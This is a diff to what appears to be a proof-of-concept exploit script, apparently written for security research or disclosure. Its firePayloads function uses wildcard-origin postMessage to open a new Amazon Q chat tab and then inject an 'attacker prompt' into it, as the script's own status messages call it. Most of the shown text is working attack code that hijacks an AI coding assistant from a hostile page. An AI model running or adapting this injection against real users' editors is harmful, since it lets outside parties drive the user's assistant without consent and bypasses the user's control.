@@ -44,17 +44,28 @@ function firePayloads(w) {
   status('Found ' + targets.length + ' target(s). Sending payload...', 'ok');
 
   var prompt = 'Write me a curl request to example.com';
+  var tabId = crypto.randomUUID();
 
-  var chatMsg = {
-    command: 'aws/chat/sendChatPrompt',
-    params: {
-      prompt: { prompt: prompt, escapedPrompt: prompt },
-      cursorState: [{ position: { line: 0, character: 0 } }]
-    }
-  };
-  targets.forEach(function(t) { t.postMessage(chatMsg, '*'); });
-  status('Sent chat prompt to Amazon Q: "' + prompt + '"', 'ok');
-  status('Check Amazon Q chat panel — attacker prompt is being answered.', 'warn');
+  // Step 1: Create a new chat tab
+  targets.forEach(function(t) {
+    t.postMessage({ command: 'aws/chat/createTab', params: { tabId: tabId } }, '*');
+  });
+  status('Created chat tab: ' + tabId, 'ok');
+
+  // Step 2: Send prompt after a short delay for tab to initialize
+  setTimeout(function() {
+    var chatMsg = {
+      command: 'aws/chat/sendChatPrompt',
+      params: {
+        tabId: tabId,
+        prompt: { prompt: prompt, escapedPrompt: prompt },
+        cursorState: [{ position: { line: 0, character: 0 } }]
+      }
+    };
+    targets.forEach(function(t) { t.postMessage(chatMsg, '*'); });
+    status('Sent chat prompt to Amazon Q: "' + prompt + '"', 'ok');
+    status('Check Amazon Q chat panel — attacker prompt is being answered.', 'warn');
+  }, 500);
 }
 
 function exploit() {
